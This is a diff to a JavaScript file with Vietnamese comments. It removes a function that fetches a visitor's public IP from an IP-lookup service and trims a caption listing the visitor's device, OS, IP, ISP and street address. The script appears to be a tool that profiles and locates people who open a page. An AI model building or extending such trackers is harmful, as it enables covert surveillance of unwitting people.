@@ -39,16 +39,6 @@ function detectDevice() {
   }
 }
 
-// ✅ Lấy IP gốc (real IP)
-async function getRealIP() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    info.realIp = data.ip || 'Không rõ';
-  } catch {
-    info.realIp = 'Không rõ';
-  }
-}
 
 // ✅ Lấy vị trí chính xác hoặc fallback IP
 function getPreciseLocationOrFallbackToIP() {
@@ -119,7 +109,6 @@ function getCaption() {
 🕒 Thời gian: ${info.time}
 📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
-🌐 IP (dân cư): ${info.ip}
 🌍 IP gốc: ${info.realIp}
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
